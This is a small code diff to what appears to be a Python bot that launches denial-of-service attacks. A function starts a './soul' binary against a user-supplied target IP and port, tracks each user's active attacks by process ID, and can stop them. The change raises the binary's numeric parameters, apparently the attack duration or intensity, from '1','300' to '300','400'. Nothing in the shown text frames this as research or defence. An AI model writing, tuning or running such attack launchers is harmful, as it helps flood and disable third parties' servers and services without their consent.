@@ -18,7 +18,7 @@ if os.path.exists('./soul'):
 def run_attack_command_sync(user_id, target_ip, target_port, action):
     try:
         if action == 1:
-            process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "300"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.Popen(["./soul", target_ip, str(target_port), "300", "400"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             active_attacks[(user_id, target_ip, target_port)] = process.pid
         elif action == 2:
             pid = active_attacks.pop((user_id, target_ip, target_port), None)
